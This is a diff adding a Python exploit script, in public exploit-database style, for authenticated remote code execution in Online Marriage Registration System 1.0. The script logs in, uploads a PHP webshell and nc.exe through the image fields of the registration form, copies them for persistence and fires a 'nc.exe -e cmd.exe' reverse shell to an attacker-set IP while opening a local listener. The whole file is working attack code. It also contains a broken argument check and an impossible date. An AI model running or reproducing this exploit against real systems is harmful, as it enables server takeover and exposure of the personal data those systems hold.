@@ -1,0 +1,128 @@
+# Exploit Title: Online Marriage Registration System (OMRS) 1.0 - Remote Code Execution (Authenticated)
+# Google Dork: N/A
+# Date: 2020-14-12
+# Exploit Author: Andrea Bruschi - www.andreabruschi.net
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/online-marriage-registration-system-using-php-and-mysql/
+# Version: 1.0
+# Tested on: Windows 10 / Xampp Server and Wamp Server
+
+#!/usr/bin/python3
+
+import requests
+import sys
+import os
+import iterm2
+import AppKit
+
+url = sys.argv[1]
+mobile = sys.argv[2]
+password = sys.argv[3] 
+
+# CONFIGURE HERE
+reverse_ip = '192.168.xx.xx'
+reverse_port = 4444
+
+# CONFIGURE HERE
+# SCRIPT WILL DOWNLOAD NETCAT AND A WEBSHELL
+netcat_path = '/local/path/to/nc.exe'
+shell_path = '/local/path/to/shell.php'
+
+
+def login(url, mobile, password):
+
+    url = "{}/user/login.php".format(url)
+    payload = {'mobno':mobile, 'password':password, 'login':''}
+    req = requests.post(url, data=payload)
+    cookie = req.cookies['PHPSESSID']
+    
+    return cookie
+
+
+def upload(url, cookie, file=None):
+
+    f = open(file, 'rb')
+    filename, ext = os.path.splitext(file)
+
+    if "exe" in ext:
+        content_type = 'application/octet-stream'
+    else:
+        content_type = 'application/x-php'
+
+    cookie = {'PHPSESSID':cookie}
+    url = "{}/user/marriage-reg-form.php".format(url)
+
+    files = {'husimage': (filename + ext, f, content_type, {'Expires': '0'}), 'wifeimage':('test.jpg','','image/jpeg')}
+    payload = {'dom':'05/01/2020','nofhusband':'test', 'hreligion':'test', 'hdob':'05/01/2020','hsbmarriage':'Bachelor','haddress':'test','hzipcode':'test','hstate':'test','hadharno':'test','nofwife':'test','wreligion':'test','wsbmarriage':'Bachelor','waddress':'test','wzipcode':'test','wstate':'test','wadharno':'test','witnessnamef':'test','waddressfirst':'test','witnessnames':'test','waddresssec':'test','witnessnamet':'test','waddressthird':'test','submit':''}
+    req = requests.post(url, data=payload, cookies=cookie, files=files)
+    print(f'[+] File {ext} uploaded')
+
+
+def get_remote_file(url, ext):
+
+    url = "{}/user/images".format(url)
+    req = requests.get(url)
+    junk = req.text.split(ext)[0]
+    f = junk[-42:] + ext
+    
+    return f
+
+
+def persistence(url, webshell, netcat):
+
+    # webshell
+    payload_w = "copy /y {} shell.php".format(webshell)
+    url_w = "{}/user/images/{}?cmd={}".format(url, webshell, payload_w)
+    req_w = requests.get(url_w)
+    
+    # netcat
+    payload_n = "copy /y {} nc.exe".format(netcat)
+    url_n = "{}/user/images/{}?cmd={}".format(url, webshell, payload_n)
+    req_n= requests.get(url_n)
+
+    print('[+] Persistence enabled')
+
+
+def get_reverse(url, ip, port):
+
+    payload = "nc.exe -nv {} {} -e cmd.exe".format(ip, port)
+    url_r = "{}/user/images/shell.php?cmd={}".format(url, payload)
+    print('[+] Reverse shell incoming!')
+    req = requests.get(url_r)
+
+
+# CONFIGURE HERE
+# THE SCRIPT WILL LAUNCH iTerm2 WINDOW RUNNING NC LISTENER
+# YOU CAN ALSO COMMENT THE CALL TO THIS FUNCTION BELOW AND START NC MANUALLY
+def start_listener(port):
+    
+    # Launch the app
+    AppKit.NSWorkspace.sharedWorkspace().launchApplication_("iTerm2")
+
+    async def main(connection):
+        app = await iterm2.async_get_app(connection)
+        window = app.current_window
+        if window is not None:
+            cmd = "nc -lnv {}".format(port)
+            await window.async_create_tab(command=cmd)
+        else:
+            print("No current window")
+
+    iterm2.run_until_complete(main)
+
+
+
+if __name__ == "__main__":
+
+    if len(sys.argv < 3): 
+        print("Usage: exploit.py <URI> <MOBILE> <PASSWORD>")
+    else:
+        cookie = login(url, mobile, password)
+        upload(url, cookie, netcat_path)
+        upload(url, cookie, shell_path)
+        webshell = get_remote_file(url, '.php')
+        netcat = get_remote_file(url, '.exe')
+        persistence(url, webshell, netcat)
+        
+        start_listener(reverse_port)
+        get_reverse(url, reverse_ip, reverse_port)
